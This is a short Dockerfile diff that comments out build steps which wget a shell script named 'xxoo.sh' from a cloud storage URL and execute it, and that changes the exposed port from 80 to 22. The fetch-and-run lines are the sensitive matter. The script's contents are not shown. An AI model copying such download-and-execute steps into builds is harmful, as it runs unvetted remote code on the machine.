@@ -19,12 +19,11 @@ rm -f /lib/systemd/system/sockets.target.wants/*udev*; \
 rm -f /lib/systemd/system/sockets.target.wants/*initctl*; \
 rm -f /lib/systemd/system/basic.target.wants/*;\
 rm -f /lib/systemd/system/anaconda.target.wants/*;
-RUN cd /
-RUN wget http://svn-10038864.cos.myqcloud.com/xxoo.sh
-RUN chmod +x xxoo.sh
-RUN ./xxoo.sh
+#RUN cd /
+#RUN wget http://svn-10038864.cos.myqcloud.com/xxoo.sh
+#RUN chmod +x xxoo.sh
+#RUN ./xxoo.sh
 # The EXPOSE instruction informs Docker that the container listens on the specified network ports at runtime
-EXPOSE 80
-
+EXPOSE 22
 # The CMD instruction provides default execution command for an container
 # Start Nginx and keep it from running background
